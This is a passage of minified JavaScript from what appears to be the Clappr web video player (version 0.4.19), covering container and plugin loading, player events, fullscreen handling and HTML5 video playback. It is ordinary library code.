e.forEach(this.setupContainer.bind(this)),this.trigger(P.CORE_CONTAINERS_CREATED),this.renderContainers(),this.activeContainer=e[0],this.render(),this.appendToParent(),this.containers}},{key:"renderContainers",value:function(){var t=this;this.containers.forEach((function(e){return t.el.appendChild(e.render().el)}))}},{key:"createContainer",value:function(e,t){return e=this.containerFactory.createContainer(e,t),this.setupContainer(e),this.el.appendChild(e.render().el),e}},{key:"getCurrentContainer",value:function(){return this.activeContainer}},{key:"getCurrentPlayback",value:function(){return this.activePlayback}},{key:"getPlaybackType",value:function(){return this.activeContainer&&this.activeContainer.getPlaybackType()}},{key:"isFullscreen",value:function(){var e,t=Mt.fullscreenElement();return!!t&&(e=this.activePlayback&&this.activePlayback.el,t===this.el||t===e)}},{key:"toggleFullscreen",value:function(){var e,t=this;this.isFullscreen()?(Mt.cancelFullscreen(),L.isiOS||this.$el.removeClass("fullscreen nocursor")):(e=L.isiOS?this.activePlayback&&this.activePlayback.el:this.el)&&(L.isSafari||L.isiOS?Mt.requestFullscreen(e):Mt.requestFullscreen(e).then((function(e){return e}),(function(e){return setTimeout((function(){if(!t.isFullscreen())throw new ReferenceError(e)}),600)})),L.isiOS||this.$el.addClass("fullscreen"))}},{key:"onMouseMove",value:function(e){this.trigger(P.CORE_MOUSE_MOVE,e)}},{key:"onMouseLeave",value:function(e){this.trigger(P.CORE_MOUSE_LEAVE,e)}},{key:"configure",value:function(e){var t=this,r=(this._options=O.extend(!0,this._options,e),this.configureDomRecycler(),e.source||e.sources);r&&this.load(r,e.mimeType||this.options.mimeType),this.trigger(P.CORE_OPTIONS_CHANGE,e),this.containers.forEach((function(e){return e.configure(t.options)}))}},{key:"appendToParent",value:function(){var e=dr.getStyleFor('[data-player] {\n  -webkit-touch-callout: none;\n  -webkit-user-select: none;\n  -moz-user-select: none;\n  -ms-user-select: none;\n  -o-user-select: none;\n  user-select: none;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  transform: translate3d(0, 0, 0);\n  position: relative;\n  margin: 0;\n  padding: 0;\n  border: 0;\n  font-style: normal;\n  font-weight: normal;\n  text-align: center;\n  overflow: hidden;\n  font-size: 100%;\n  font-family: "Roboto", "Open Sans", Arial, sans-serif;\n  text-shadow: 0 0 0;\n  box-sizing: border-box; }\n  [data-player]:focus {\n    outline: 0; }\n  [data-player] * {\n    box-sizing: inherit; }\n  [data-player] > * {\n    float: none;\n    max-width: none; }\n  [data-player] > div {\n    display: block; }\n  [data-player].fullscreen {\n    width: 100% !important;\n    height: 100% !important;\n    top: 0;\n    left: 0; }\n  [data-player].nocursor {\n    cursor: none; }\n\n.clappr-style {\n  display: none !important; }\n'.toString(),{baseUrl:this.options.baseUrl}),t=dr.getStyleFor('[data-player] div, [data-player] span, [data-player] applet, [data-player] object, [data-player] iframe,\n[data-player] h1, [data-player] h2, [data-player] h3, [data-player] h4, [data-player] h5, [data-player] h6, [data-player] p, [data-player] blockquote, [data-player] pre,\n[data-player] a, [data-player] abbr, [data-player] acronym, [data-player] address, [data-player] big, [data-player] cite, [data-player] code,\n[data-player] del, [data-player] dfn, [data-player] em, [data-player] img, [data-player] ins, [data-player] kbd, [data-player] q, [data-player] s, [data-player] samp,\n[data-player] small, [data-player] strike, [data-player] strong, [data-player] sub, [data-player] sup, [data-player] tt, [data-player] var,\n[data-player] b, [data-player] u, [data-player] i, [data-player] center,\n[data-player] dl, [data-player] dt, [data-player] dd, [data-player] ol, [data-player] ul, [data-player] li,\n[data-player] fieldset, [data-player] form, [data-player] label, [data-player] legend,\n[data-player] table, [data-player] caption, [data-player] tbody, [data-player] tfoot, [data-player] thead, [data-player] tr, [data-player] th, [data-player] td,\n[data-player] article, [data-player] aside, [data-player] canvas, [data-player] details, [data-player] embed,\n[data-player] figure, [data-player] figcaption, [data-player] footer, [data-player] header, [data-player] hgroup,\n[data-player] menu, [data-player] nav, [data-player] output, [data-player] ruby, [data-player] section, [data-player] summary,\n[data-player] time, [data-player] mark, [data-player] audio, [data-player] video {\n  margin: 0;\n  padding: 0;\n  border: 0;\n  font: inherit;\n  font-size: 100%;\n  vertical-align: baseline; }\n\n[data-player] table {\n  border-collapse: collapse;\n  border-spacing: 0; }\n\n[data-player] caption, [data-player] th, [data-player] td {\n  text-align: left;\n  font-weight: normal;\n  vertical-align: middle; }\n\n[data-player] q, [data-player] blockquote {\n  quotes: none; }\n  [data-player] q:before, [data-player] q:after, [data-player] blockquote:before, [data-player] blockquote:after {\n    content: "";\n    content: none; }\n\n[data-player] a img {\n  border: none; }\n'.toString(),{baseUrl:this.options.baseUrl});this.$el.append(e[0]),this.options.includeResetStyle&&this.$el.append(t[0]),this.$el.parent()&&this.$el.parent().length||this.$el.appendTo(this.options.parentElement)}},{key:"render",value:function(){this.options.width=this.options.width||this.$el.width(),this.options.height=this.options.height||this.$el.height();var e={width:this.options.width,height:this.options.height};return this.previousSize=this.currentSize=this.computedSize=e,this.updateSize(),this.enableResizeObserver(),this}}]),n}(),yr=(Object.assign(mr.prototype,t),function(){c(n,N);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).player=e,t}return s(n,[{key:"loader",get:function(){return this.player.loader}}]),s(n,[{key:"create",value:function(){return this.options.loader=this.loader,this.core=new mr(this.options),this.addCorePlugins(),this.core.createContainers(this.options),this.core}},{key:"addCorePlugins",value:function(){var t=this;return this.loader.corePlugins.forEach((function(e){e=new e(t.core),t.core.addPlugin(e),t.setupExternalInterface(e)})),this.core}},{key:"setupExternalInterface",value:function(e){var t,r=e.getExternalInterface();for(t in r)this.player[t]=r[t].bind(e)}}]),n}()),Er=/(\d+)(?:\.(\d+))?(?:\.(\d+))?/,br=function(){function n(e,t,r){u(this,n),this.major=parseInt(e||0,10),this.minor=parseInt(t||0,10),this.patch=parseInt(r||0,10)}return s(n,null,[{key:"parse",value:function(){var t=(e=Y((0<arguments.length&&void 0!==arguments[0]?arguments[0]:"").match(Er)||[],4))[1],r=e[2],e=e[3];return void 0===t?null:new n(t,r,e)}}]),s(n,[{key:"compare",value:function(e){return this.major-e.major||this.minor-e.minor||this.patch-e.patch}},{key:"inc",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:"patch";return void 0!==this[e]&&(this[e]+=1),this}},{key:"satisfies",value:function(e,t){return 0<=this.compare(e)&&(!t||this.compare(t)<0)}},{key:"toString",value:function(){return"".concat(this.major,".").concat(this.minor,".").concat(this.patch)}}]),n}(),kr=(I={plugins:{},playbacks:[]},function(){function i(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=(t=(u(this,i),this.playerId=t,this.playbackPlugins=H(I.playbacks),i.registeredPlugins)).core;t=t.container;this.containerPlugins=Object.values(t),this.corePlugins=Object.values(r),Array.isArray(e)||this.validateExternalPluginsType(e),this.addExternalPlugins(e)}return s(i,null,[{key:"checkVersionSupport",value:function(e){var t,r=(e=e.prototype).supportedVersion;e=e.name;return r&&r.min?(t=r.max?br.parse(r.max):br.parse(r.min).inc("minor"),r=br.parse(r.min),!!br.parse("0.4.19").satisfies(r,t)||(D.warn("Loader","unsupported plugin ".concat(e,": Clappr version ").concat("0.4.19"," does not match required range [").concat(r,",").concat(t,")")),!1)):(D.warn("Loader","missing version information for ".concat(e)),!1)}},{key:"registerPlugin",value:function(e){if(!e||!e.prototype.name)return D.warn("Loader","missing information to register plugin: ".concat(e)),!1;i.checkVersionSupport(e);var t,r=I.plugins;return!!r&&((t=r[e.prototype.name])&&D.warn("Loader","overriding plugin entry: ".concat(e.prototype.name," - ").concat(t)),r[e.prototype.name]=e,!0)}},{key:"registerPlayback",value:function(t){if(!t||!t.prototype.name)return!1;i.checkVersionSupport(t);var e,r=I.playbacks,n=r.findIndex((function(e){return e.prototype.name===t.prototype.name}));return 0<=n&&(e=r[n],r.splice(n,1),D.warn("Loader","overriding playback entry: ".concat(e.name," - ").concat(e))),I.playbacks=[t].concat(H(r)),!0}},{key:"unregisterPlugin",value:function(e){var t;return!!e&&!!(t=I.plugins)[e]&&(delete t[e],!0)}},{key:"unregisterPlayback",value:function(t){var e,r;return!!t&&!((r=(e=I.playbacks).findIndex((function(e){return e.prototype.name===t})))<0||(e.splice(r,1),I.playbacks=e,0))}},{key:"clearPlugins",value:function(){I.plugins={}}},{key:"clearPlaybacks",value:function(){I.playbacks=[]}},{key:"registeredPlaybacks",get:function(){return H(I.playbacks)}},{key:"registeredPlugins",get:function(){var e=I.plugins;return{core:Wt(e,"core"),container:Wt(e,"container")}}}]),s(i,[{key:"groupPluginsByType",value:function(e){return Array.isArray(e)?e.reduce((function(e,t){return e[t.type]||(e[t.type]=[]),e[t.type].push(t),e}),{}):e}},{key:"removeDups",value:function(e){var t,r=1<arguments.length&&void 0!==arguments[1]&&arguments[1],n=e.reduceRight((function(e,t){return e[t.prototype.name]&&r||(e[t.prototype.name]&&delete e[t.prototype.name],e[t.prototype.name]=t),e}),Object.create(null)),i=[];for(t in n)i.unshift(n[t]);return i}},{key:"addExternalPlugins",value:function(e){var t,r="boolean"!=typeof e.loadExternalPluginsFirst||e.loadExternalPluginsFirst,n="boolean"!=typeof e.loadExternalPlaybacksFirst||e.loadExternalPlaybacksFirst;(e=this.groupPluginsByType(e)).playback&&(t=e.playback.filter((function(e){return i.checkVersionSupport(e),!0})),this.playbackPlugins=n?this.removeDups(t.concat(this.playbackPlugins)):this.removeDups(this.playbackPlugins.concat(t),!0)),e.container&&(n=e.container.filter((function(e){return i.checkVersionSupport(e),!0})),this.containerPlugins=r?this.removeDups(n.concat(this.containerPlugins)):this.removeDups(this.containerPlugins.concat(n),!0)),e.core&&(t=e.core.filter((function(e){return i.checkVersionSupport(e),!0})),this.corePlugins=r?this.removeDups(t.concat(this.corePlugins)):this.removeDups(this.corePlugins.concat(t),!0))}},{key:"validateExternalPluginsType",value:function(e){["playback","container","core"].forEach((function(r){(e[r]||[]).forEach((function(e){var t="external "+e.type+" plugin on "+r+" array";if(e.type!==r)throw new ReferenceError(t)}))}))}}]),i}()),_r=Vt().replace(/\/[^/]+$/,""),Tr=(e=function(){c(i,N);var n=d(i);function i(e){u(this,i),t=n.call(this,e);var t,r={playerId:Ut(""),persistConfig:!0,width:640,height:360,baseUrl:_r,allowUserInteraction:L.isMobile,includeResetStyle:!0,playback:{recycleVideo:!0}};return t._options=O.extend(!0,r,e),t.options.sources=t._normalizeSources(e),t.options.chromeless||(t.options.allowUserInteraction=!0),t.options.allowUserInteraction||(t.options.disableKeyboardShortcuts=!0),t._registerOptionEventListeners(t.options.events),t._coreFactory=new yr(G(t)),t.options.parentId?t.setParentId(t.options.parentId):t.options.parent&&t.attachTo(t.options.parent),t}return s(i,[{key:"loader",set:function(e){this._loader=e},get:function(){return this._loader||(this._loader=new kr(this.options.plugins||{},this.options.playerId)),this._loader}},{key:"ended",get:function(){return this.core.activeContainer.ended}},{key:"buffering",get:function(){return this.core.activeContainer.buffering}},{key:"isReady",get:function(){return!!this._ready}},{key:"eventsMapping",get:function(){return{onReady:P.PLAYER_READY,onResize:P.PLAYER_RESIZE,onPlay:P.PLAYER_PLAY,onPause:P.PLAYER_PAUSE,onStop:P.PLAYER_STOP,onEnded:P.PLAYER_ENDED,onSeek:P.PLAYER_SEEK,onError:P.PLAYER_ERROR,onTimeUpdate:P.PLAYER_TIMEUPDATE,onVolumeUpdate:P.PLAYER_VOLUMEUPDATE,onSubtitleAvailable:P.PLAYER_SUBTITLE_AVAILABLE}}}]),s(i,[{key:"setParentId",value:function(e){return(e=document.querySelector(e))&&this.attachTo(e),this}},{key:"attachTo",value:function(e){return this.options.parentElement=e,this.core=this._coreFactory.create(),this._addEventListeners(),this}},{key:"_addEventListeners",value:function(){return this.core.isReady?this._onReady():this.listenToOnce(this.core,P.CORE_READY,this._onReady),this.listenTo(this.core,P.CORE_ACTIVE_CONTAINER_CHANGED,this._containerChanged),this.listenTo(this.core,P.CORE_FULLSCREEN,this._onFullscreenChange),this.listenTo(this.core,P.CORE_RESIZE,this._onResize),this}},{key:"_addContainerEventListeners",value:function(){var e=this.core.activeContainer;return e&&(this.listenTo(e,P.CONTAINER_PLAY,this._onPlay),this.listenTo(e,P.CONTAINER_PAUSE,this._onPause),this.listenTo(e,P.CONTAINER_STOP,this._onStop),this.listenTo(e,P.CONTAINER_ENDED,this._onEnded),this.listenTo(e,P.CONTAINER_SEEK,this._onSeek),this.listenTo(e,P.CONTAINER_ERROR,this._onError),this.listenTo(e,P.CONTAINER_TIMEUPDATE,this._onTimeUpdate),this.listenTo(e,P.CONTAINER_VOLUME,this._onVolumeUpdate),this.listenTo(e,P.CONTAINER_SUBTITLE_AVAILABLE,this._onSubtitleAvailable)),this}},{key:"_registerOptionEventListeners",value:function(){var r=this,n=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{},i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};return 0<Object.keys(n).length&&Object.keys(i).forEach((function(e){var t=r.eventsMapping[e];t&&r.off(t,i[e])})),Object.keys(n).forEach((function(e){var t=r.eventsMapping[e];t&&(e="function"==typeof(e=n[e])&&e)&&r.on(t,e)})),this}},{key:"_containerChanged",value:function(){this.stopListening(),this._addEventListeners()}},{key:"_onReady",value:function(){this._ready=!0,this._addContainerEventListeners(),this.trigger(P.PLAYER_READY)}},{key:"_onFullscreenChange",value:function(e){this.trigger(P.PLAYER_FULLSCREEN,e)}},{key:"_onVolumeUpdate",value:function(e){this.trigger(P.PLAYER_VOLUMEUPDATE,e)}},{key:"_onSubtitleAvailable",value:function(){this.trigger(P.PLAYER_SUBTITLE_AVAILABLE)}},{key:"_onResize",value:function(e){this.trigger(P.PLAYER_RESIZE,e)}},{key:"_onPlay",value:function(){this.trigger(P.PLAYER_PLAY)}},{key:"_onPause",value:function(){this.trigger(P.PLAYER_PAUSE)}},{key:"_onStop",value:function(){this.trigger(P.PLAYER_STOP,this.getCurrentTime())}},{key:"_onEnded",value:function(){this.trigger(P.PLAYER_ENDED)}},{key:"_onSeek",value:function(e){this.trigger(P.PLAYER_SEEK,e)}},{key:"_onTimeUpdate",value:function(e){this.trigger(P.PLAYER_TIMEUPDATE,e)}},{key:"_onError",value:function(e){this.trigger(P.PLAYER_ERROR,e)}},{key:"_normalizeSources",value:function(e){return 0===(e=e.sources||(void 0!==e.source?[e.source]:[])).length?[{source:"",mimeType:""}]:e}},{key:"resize",value:function(e){return this.core.resize(e),this}},{key:"load",value:function(e,t,r){return void 0!==r&&this.configure({autoPlay:!!r}),this.core.load(e,t),this}},{key:"destroy",value:function(){return this.stopListening(),this.core.destroy(),this}},{key:"consent",value:function(e){this.core.getCurrentPlayback().consent(e)}},{key:"play",value:function(){return this.core.activeContainer.play(),this}},{key:"pause",value:function(){return this.core.activeContainer.pause(),this}},{key:"stop",value:function(){return this.core.activeContainer.stop(),this}},{key:"seek",value:function(e){return this.core.activeContainer.seek(e),this}},{key:"seekPercentage",value:function(e){return this.core.activeContainer.seekPercentage(e),this}},{key:"mute",value:function(){return this.core.activePlayback.mute(),this}},{key:"unmute",value:function(){return this.core.activePlayback.unmute(),this}},{key:"isPlaying",value:function(){return this.core.activeContainer.isPlaying()}},{key:"isDvrEnabled",value:function(){return this.core.activeContainer.isDvrEnabled()}},{key:"isDvrInUse",value:function(){return this.core.activeContainer.isDvrInUse()}},{key:"configure",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{};return this._registerOptionEventListeners(e.events,this.options.events),this.core.configure(e),this}},{key:"getPlugin",value:function(t){return this.core.plugins.concat(this.core.activeContainer.plugins).filter((function(e){return e.name===t}))[0]}},{key:"getCurrentTime",value:function(){return this.core.activeContainer.getCurrentTime()}},{key:"getStartTimeOffset",value:function(){return this.core.activeContainer.getStartTimeOffset()}},{key:"getDuration",value:function(){return this.core.activeContainer.getDuration()}}]),i}(),Object.assign(e.prototype,t),function(){c(n,N);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).container=e,t.enabled=!0,t.bindEvents(),t}return s(n,[{key:"playerError",get:function(){return this.container.playerError}}]),s(n,[{key:"enable",value:function(){this.enabled||(this.bindEvents(),this.enabled=!0)}},{key:"disable",value:function(){this.enabled&&(this.stopListening(),this.enabled=!1)}},{key:"bindEvents",value:function(){}},{key:"destroy",value:function(){this.stopListening()}}]),n}()),Sr=(Object.assign(Tr.prototype,t),Tr.extend=function(e){return xt(Tr,e)},Tr.type="container",function(){c(n,N);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).core=e,t.enabled=!0,t.bindEvents(),t}return s(n,[{key:"playerError",get:function(){return this.core.playerError}}]),s(n,[{key:"bindEvents",value:function(){}},{key:"enable",value:function(){this.enabled||(this.bindEvents(),this.enabled=!0)}},{key:"disable",value:function(){this.enabled&&(this.stopListening(),this.enabled=!1)}},{key:"getExternalInterface",value:function(){return{}}},{key:"destroy",value:function(){this.stopListening()}}]),n}()),Cr=(Object.assign(Sr.prototype,t),Sr.extend=function(e){return xt(Sr,e)},Sr.type="core",function(){c(n,hr);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).container=e,t.enabled=!0,t.bindEvents(),t}return s(n,[{key:"playerError",get:function(){return this.container.playerError}}]),s(n,[{key:"enable",value:function(){this.enabled||(this.bindEvents(),this.$el.show(),this.enabled=!0)}},{key:"disable",value:function(){this.stopListening(),this.$el.hide(),this.enabled=!1}},{key:"bindEvents",value:function(){}}]),n}()),Rr=(Object.assign(Cr.prototype,t),Cr.extend=function(e){return xt(Cr,e)},Cr.type="container",{mp4:["avc1.42E01E","avc1.58A01E","avc1.4D401E","avc1.64001E","mp4v.20.8","mp4v.20.240","mp4a.40.2"].map((function(e){return'video/mp4; codecs="'+e+', mp4a.40.2"'})),ogg:['video/ogg; codecs="theora, vorbis"','video/ogg; codecs="dirac"','video/ogg; codecs="theora, speex"'],"3gpp":['video/3gpp; codecs="mp4v.20.8, samr"'],webm:['video/webm; codecs="vp8, vorbis"'],mkv:['video/x-matroska; codecs="theora, vorbis"'],m3u8:["application/x-mpegurl"]}),wr=(Rr.ogv=Rr.ogg,Rr["3gp"]=Rr["3gpp"],{wav:["audio/wav"],mp3:["audio/mp3",'audio/mpeg;codecs="mp3"'],aac:['audio/mp4;codecs="mp4a.40.5"'],oga:["audio/ogg"]}),Or=Object.keys(wr).reduce((function(e,t){return[].concat(H(e),H(wr[t]))}),[]),Lr={code:"unknown",message:"unknown"},M=function(){c(l,x);var o=d(l);function l(){var e;u(this,l);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];(e=o.call.apply(o,[this].concat(r)))._destroyed=!1,e._loadStarted=!1,e._isBuffering=!1,e._playheadMoving=!1,e._playheadMovingTimer=null,e._stopped=!1,e._ccTrackId=-1,e._setupSrc(e.options.src),e.options.playback||(e.options.playback=e.options||{}),e.options.playback.disableContextMenu=e.options.playback.disableContextMenu||e.options.disableVideoTagContextMenu,e._minDvrSize=e.isValidMinimumDVRSizeConfig?e.minimumDVRSizeConfig:60;var i,a=e.options.playback,s=a.preload||(L.isSafari?"auto":e.options.preload);return e.options.poster&&("string"==typeof e.options.poster?i=e.options.poster:"string"==typeof e.options.poster.url&&(i=e.options.poster.url)),O.extend(!0,e.el,{muted:e.options.mute,defaultMuted:e.options.mute,loop:e.options.loop,poster:i,preload:s||"metadata",crossOrigin:a.crossOrigin,"x-webkit-playsinline":a.playInline}),(a.controls||e.options.useVideoTagDefaultControls)&&e.$el.attr("controls",""),a.playInline&&e.$el.attr({playsinline:"playsinline"}),a.crossOrigin&&e.$el.attr({crossorigin:a.crossOrigin}),e.settings={default:["seekbar"]},e.settings.left=["playpause","position","duration"],e.settings.right=["fullscreen","volume","hd-indicator"],a.externalTracks&&e._setupExternalTracks(a.externalTracks),e.options.autoPlay&&e.attemptAutoPlay(),e}return s(l,[{key:"name",get:function(){return"html5_video"}},{key:"supportedVersion",get:function(){return{min:"0.4.19"}}},{key:"tagName",get:function(){return this.isAudioOnly?"audio":"video"}},{key:"isAudioOnly",get:function(){var e=this.options.src;e=l._mimeTypesForUrl(e,wr,this.options.mimeType);return this.options.playback&&this.options.playback.audioOnly||this.options.audioOnly||0<=Or.indexOf(e[0])}},{key:"attributes",get:function(){return{"data-html5-video":""}}},{key:"events",get:function(){return{canplay:"_onCanPlay",canplaythrough:"_handleBufferingEvents",durationchange:"_onDurationChange",ended:"_onEnded",error:"_onError",loadeddata:"_onLoadedData",loadedmetadata:"_onLoadedMetadata",pause:"_onPause",playing:"_onPlaying",progress:"_onProgress",seeking:"_onSeeking",seeked:"_onSeeked",stalled:"_handleBufferingEvents",timeupdate:"_onTimeUpdate",waiting:"_onWaiting"}}},{key:"ended",get:function(){return this.el.ended}},{key:"buffering",get:function(){return this._isBuffering}},{key:"isLive",get:function(){return this.getPlaybackType()===x.LIVE}},{key:"dvrEnabled",get:function(){return this.getDuration()>=this._minDvrSize&&this.isLive}},{key:"minimumDVRSizeConfig",get:function(){return this.options.playback&&this.options.playback.minimumDvrSize}},{key:"isValidMinimumDVRSizeConfig",get:function(){return void 0!==this.minimumDVRSizeConfig&&"number"==typeof this.minimumDVRSizeConfig}}]),s(l,[{key:"configure",value:function(e){K(a(l.prototype),"configure",this).call(this,e),this.el.loop=!!e.loop}},{key:"attemptAutoPlay",value:function(){var r=this;this.canAutoPlay((function(e,t){t&&D.warn(r.name,"autoplay error.",{result:e,error:t}),e&&setTimeout((function(){return!r._destroyed&&r.play()}),0)}))}},{key:"canAutoPlay",value:function(e){var t;this.options.disableCanAutoPlay?e(!0,null):(t={timeout:this.options.autoPlayTimeout||500,inline:this.options.playback.playInline||!1,muted:this.options.mute||!1},L.isMobile&&qt.options.recycleVideo&&(t.element=this.el),Kt(e,t))}},{key:"_setupExternalTracks",value:function(e){this._externalTracks=e.map((function(e){return{kind:e.kind||"subtitles",label:e.label,lang:e.lang,src:e.src}}))}},{key:"_setupSrc",value:function(e){this.el.src!==e&&(this._ccIsSetup=!1,this.el.src=e,this._src=this.el.src)}},{key:"_onLoadedMetadata",value:function(e){this._handleBufferingEvents(),this.trigger(P.PLAYBACK_LOADEDMETADATA,{duration:e.target.duration,data:e}),this._updateSettings(),e=void 0===this._options.autoSeekFromUrl||this._options.autoSeekFromUrl,this.getPlaybackType()!==x.LIVE&&e&&this._checkInitialSeek()}},{key:"_onDurationChange",value:function(){this._updateSettings(),this._onTimeUpdate(),this._onProgress()}},{key:"_updateSettings",value:function(){this.getPlaybackType()===x.VOD||this.getPlaybackType()===x.AOD?this.settings.left=["playpause","position","duration"]:this.settings.left=["playstop"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(P.PLAYBACK_SETTINGSUPDATE)}},{key:"isSeekEnabled",value:function(){return isFinite(this.getDuration())}},{key:"getPlaybackType",value:function(){var e="audio"===this.tagName?x.AOD:x.VOD;return 0<=[0,void 0,1/0].indexOf(this.el.duration)?x.LIVE:e}},{key:"isHighDefinitionInUse",value:function(){return!1}},{key:"consent",value:function(t){var e,r=this;this.isPlaying()||this.el._consented?K(a(l.prototype),"consent",this).call(this,t):(this.el.addEventListener("loadedmetadata",e=function e(){r.el.removeEventListener("loadedmetadata",e,!1),r.el.removeEventListener("error",e,!1),r.el._consented=!0,K(a(l.prototype),"consent",r).call(r,t)},!1),this.el.addEventListener("error",e,!1),this.el.load())}},{key:"play",value:function(){this.trigger(P.PLAYBACK_PLAY_INTENT),this._stopped=!1,this._setupSrc(this._src),this._handleBufferingEvents();var e=this.el.play();e&&e.catch&&e.catch((function(){}))}},{key:"pause",value:function(){this.el.pause(),this.dvrEnabled&&this._updateDvr(!0)}},{key:"stop",value:function(){this.pause(),this._stopped=!0,this.el.removeAttribute("src"),this.el.load(),this._stopPlayheadMovingChecks(),this._handleBufferingEvents(),this.trigger(P.PLAYBACK_STOP)}},{key:"volume",value:function(e){0===e?(this.$el.attr({muted:"true"}),this.el.muted=!0):(this.$el.attr({muted:null}),this.el.muted=!1,this.el.volume=e/100)}},{key:"mute",value:function(){this.el.muted=!0}},{key:"unmute",value:function(){this.el.muted=!1}},{key:"isMuted",value:function(){return!0===this.el.muted||0===this.el.volume}},{key:"isPlaying",value:function(){return!this.el.paused&&!this.el.ended}},{key:"_startPlayheadMovingChecks",value:function(){null===this._playheadMovingTimer&&(this._playheadMovingTimeOnCheck=null,this._determineIfPlayheadMoving(),this._playheadMovingTimer=setInterval(this._determineIfPlayheadMoving.bind(this),500))}},{key:"_stopPlayheadMovingChecks",value:function(){null!==this._playheadMovingTimer&&(clearInterval(this._playheadMovingTimer),this._playheadMovingTimer=null,this._playheadMoving=!1)}},{key:"_determineIfPlayheadMoving",value:function(){var e=this._playheadMovingTimeOnCheck,t=this.el.currentTime;this._playheadMoving=e!==t,this._playheadMovingTimeOnCheck=t,this._handleBufferingEvents()}},{key:"_onWaiting",value:function(){this._loadStarted=!0,this._handleBufferingEvents()}},{key:"_onLoadedData",value:function(){this._loadStarted=!0,this._handleBufferingEvents()}},{key:"_onCanPlay",value:function(){this._handleBufferingEvents()}},{key:"_onPlaying",value:function(){this._checkForClosedCaptions(),this._startPlayheadMovingChecks(),this._handleBufferingEvents(),this.trigger(P.PLAYBACK_PLAY)}},{key:"_onPause",value:function(){this._stopPlayheadMovingChecks(),this._handleBufferingEvents(),this.trigger(P.PLAYBACK_PAUSE)}},{key:"_onSeeking",value:function(){this.trigger(P.PLAYBACK_SEEK,this.getCurrentTime()),this._handleBufferingEvents()}},{key:"_onSeeked",value:function(){this._handleBufferingEvents(),this.trigger(P.PLAYBACK_SEEKED)}},{key:"_onEnded",value:function(){this._handleBufferingEvents(),this.trigger(P.PLAYBACK_ENDED,this.name)}},{key:"_handleBufferingEvents",value:function(){var e=!this.el.ended&&!this.el.paused;e=this._loadStarted&&!this.el.ended&&!this._stopped&&(e&&!this._playheadMoving||this.el.readyState<this.el.HAVE_FUTURE_DATA);this._isBuffering!==e&&((this._isBuffering=e)?this.trigger(P.PLAYBACK_BUFFERING,this.name):this.trigger(P.PLAYBACK_BUFFERFULL,this.name))}},{key:"_onError",value:function(){var t=(e=this.el.error||Lr).code,e=e.message,r=t===Lr.code;t=this.createError({code:t,description:e,raw:this.el.error,level:r?pr.Levels.WARN:pr.Levels.FATAL});r?D.warn(this.name,"HTML5 unknown error: ",t):this.trigger(P.PLAYBACK_ERROR,t)}},{key:"destroy",value:function(){this._destroyed=!0,this.handleTextTrackChange&&this.el.textTracks.removeEventListener("change",this.handleTextTrackChange),K(a(l.prototype),"destroy",this).call(this),this.el.removeAttribute("src"),this.el.load(),this._src=null,qt.garbage(this.el)}},{key:"_updateDvr",value:function(e){this.trigger(P.PLAYBACK_DVR,e),this.trigger(P.PLAYBACK_STATS_ADD,{dvr:e})}},{key:"seek",value:function(e){e<0&&(D.warn("Attempt to seek to a negative time. Resetting to live point. Use seekToLivePoint() to seek to the live point."),e=this.getDuration()),this.dvrEnabled&&this._updateDvr(e<this.getDuration()-3),e+=this.el.seekable.start(0),this.el.currentTime=e}},{key:"seekPercentage",value:function(e){e=this.el.duration*(e/100),this.seek(e)}},{key:"_checkInitialSeek",value:function(){var e=Bt();0!==e&&this.seek(e)}},{key:"getCurrentTime",value:function(){return this.el.currentTime}},{key:"getDuration",value:function(){if(this.isLive){if(0<this.el.seekable.length)return this.el.seekable.end(0)-this.el.seekable.start(0);this._scheduleUpdateSettingsCheck()}return this.el.duration}},{key:"_scheduleUpdateSettingsCheck",value:function(){var e=this;this._updateSettingsCheckInFlight||(this._updateSettingsCheckInFlight=setTimeout((function(){e._updateSettings(),e._updateSettingsCheckInFlight=null}),1e3))}},{key:"_onTimeUpdate",value:function(){var e=this.isLive?this.getDuration():this.el.duration;this.trigger(P.PLAYBACK_TIMEUPDATE,{current:this.el.currentTime,total:e},this.name)}},{key:"_onProgress",value:function(){if(this.el.buffered.length){for(var e=[],t=0,r=0;r<this.el.buffered.length;r++)e=[].concat(H(e),[{start:this.el.buffered.start(r),end:this.el.buffered.end(r)}]),this.el.currentTime>=e[r].start&&this.el.currentTime<=e[r].end&&(t=r);var n={start:e[t].start,current:e[t].end,total:this.el.duration};this.trigger(P.PLAYBACK_PROGRESS,n,e)}}},{key:"_typeFor",value:function(e){var t=l._mimeTypesForUrl(e,Rr,this.options.mimeType);return((t=0===t.length?l._mimeTypesForUrl(e,wr,this.options.mimeType):t)[0]||"").split(";")[0]}},{key:"_ready",value:function(){this._isReadyState||(this._isReadyState=!0,this.trigger(P.PLAYBACK_READY,this.name))}},{key:"_checkForClosedCaptions",value:function(){var e;this.isHTML5Video&&!this._ccIsSetup&&(this.hasClosedCaptionsTracks&&(this.trigger(P.PLAYBACK_SUBTITLE_AVAILABLE),e=this.closedCaptionsTrackId,this.closedCaptionsTrackId=e,this.handleTextTrackChange=this._handleTextTrackChange.bind(this),this.el.textTracks.addEventListener("change",this.handleTextTrackChange)),this._ccIsSetup=!0)}},{key:"_handleTextTrackChange",value:function(){var e=this.closedCaptionsTracks.find((function(e){return"showing"===e.track.mode}))||{id:-1};this._ccTrackId!==e.id&&(this._ccTrackId=e.id,this.trigger(P.PLAYBACK_SUBTITLE_CHANGED,{id:e.id}))}},{key:"render",value:function(){this.options.playback.disableContextMenu&&this.$el.on("contextmenu",(function(){return!1})),this._externalTracks&&0<this._externalTracks.length&&this.$el.html(this.template({tracks:this._externalTracks})),this._ready();var e=dr.getStyleFor("[data-html5-video] {\n  position: absolute;\n  height: 100%;\n  width: 100%;\n  display: block; }\n".toString(),{baseUrl:this.options.baseUrl});return this.$el.append(e[0]),this}},{key:"isReady",get:function(){return this._isReadyState}},{key:"isHTML5Video",get:function(){return 